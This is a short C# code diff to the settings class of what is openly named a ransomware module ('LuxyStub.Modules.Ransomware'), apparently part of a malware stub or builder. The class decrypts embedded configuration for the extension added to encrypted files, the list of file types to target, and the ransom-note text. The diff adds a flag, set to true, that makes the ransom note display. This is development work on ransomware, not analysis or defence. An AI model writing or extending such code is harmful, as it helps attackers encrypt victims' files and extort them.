@@ -14,6 +14,7 @@ namespace LuxyStub.Modules.Ransomware
         internal static string EncryptExtension { get; set; }
         internal static string[] EncryptExtensionList { get; set; }
         internal static string ReadMeMessage { get; set; }
+        internal static bool ShowReadMeMessage { get; set; }
 
         static Settings()
         {
@@ -26,6 +27,8 @@ namespace LuxyStub.Modules.Ransomware
             var encryptedStrEncryptExtensionList = "";
             var encryptedReadMeMessage = "";
 
+            var showreadmemessage = true;
+
             // ---------------- Initialise variables ----------------
 
             var conv_key = Convert.FromBase64String(key);
@@ -35,6 +38,7 @@ namespace LuxyStub.Modules.Ransomware
             EncryptExtension = Decrypt(Convert.FromBase64String(encryptedEncryptExtension), conv_key, conv_iv);
             EncryptExtensionList = Decrypt(Convert.FromBase64String(encryptedStrEncryptExtensionList), conv_key, conv_iv).Split(',');
             ReadMeMessage = Decrypt(Convert.FromBase64String(encryptedReadMeMessage), conv_key, conv_iv);
+            ShowReadMeMessage = showreadmemessage;
 
         }
 
